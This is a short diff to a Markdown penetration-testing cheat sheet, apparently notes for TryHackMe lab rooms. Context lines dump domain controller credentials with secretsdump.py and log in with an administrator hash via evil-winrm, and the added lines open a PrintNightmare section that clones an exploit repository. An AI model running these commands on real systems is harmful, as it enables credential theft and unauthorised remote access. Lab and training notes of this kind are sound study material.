@@ -652,3 +652,13 @@ sudo secretsdump.py -just-dc -no-pass DC01\$@<dc-ip>
 
 evil-winrm -u Administrator -H <Local Admin Hash> -i MACHINE_IP
 ```
+
+## CVE-2021-1675 / CVE -2021-34527 (PrintNightmare)
+
+https://tryhackme.com/room/printnightmarehpzqlp8
+
+- Windows 印刷Spoolerサービス脆弱性によるRCE
+
+```sh
+git clone https://github.com/tryhackme/CVE-2021-1675.git 
+```
